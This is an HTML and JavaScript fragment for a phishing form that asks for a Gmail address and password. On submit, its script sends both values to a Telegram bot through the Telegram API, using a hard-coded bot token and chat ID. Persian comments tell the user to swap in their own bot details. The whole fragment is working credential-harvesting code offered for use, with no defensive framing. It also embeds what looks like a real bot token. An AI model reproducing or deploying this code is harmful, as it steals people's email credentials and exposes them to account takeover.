    <div class="form-container">
        <input type="text" id="message1" class="input-field" placeholder="GMAIL">
        <input type="text" id="message2" class="input-field" placeholder="PSSWORD">
        <button onclick="sendMessage()">SEND</button>

    <script>
        function sendMessage() {
    const message1 = document.getElementById('message1').value;
    const message2 = document.getElementById('message2').value;
    const chatId = '1209515299'; // جایگزین با شناسه چت خود
    const botToken = '6923568496:AAHM_gMcdsy-O712NIoj87NbVe1fp7auoiw'; // جایگزین با توکن بات خود

    fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message1 + ' ' + message2)}`)
    .then(response => response.json())
    .then(data => {
        console.log('Message sent:', data);
        alert('The message was successfully send ');
    })
    .catch(error => {
        console.error('Error sending message:', error);
        alert('ارسال پیام ناموفق بود.');
    });
}
